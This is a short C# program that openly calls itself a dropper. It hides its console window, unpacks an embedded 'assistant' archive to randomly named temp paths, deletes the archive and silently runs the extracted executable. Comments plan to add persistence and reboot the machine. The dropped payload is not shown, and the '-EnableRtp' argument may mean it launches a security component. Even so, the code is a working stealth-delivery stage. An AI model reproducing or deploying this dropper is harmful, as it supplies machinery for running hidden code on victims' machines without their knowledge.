using System;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Diagnostics;

namespace MalwarebytesDropper
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            string randomFileName = $"{Path.GetRandomFileName()}.zip";
            string tempZipPath = Path.Combine(Path.GetTempPath(), randomFileName);

            File.WriteAllBytes(tempZipPath, Properties.Resources.assistant);

            string randomPathName = Path.GetRandomFileName();
            string extractPath = Path.Combine(Path.GetTempPath(), randomPathName);
            Directory.CreateDirectory(extractPath);

            ZipFile.ExtractToDirectory(tempZipPath, extractPath);
            File.Delete(tempZipPath);

            StartProcess(Path.Combine(extractPath, "assistant.exe"), "-EnableRtp");

            //add persistence
            //reboot machine
        }

        static void StartProcess(string filePath, string arguments)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = arguments,
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            try
            {
                Process process = Process.Start(processInfo);
                process.WaitForExit();
            }
            catch (Exception)
            {
            }
        }
    }
}
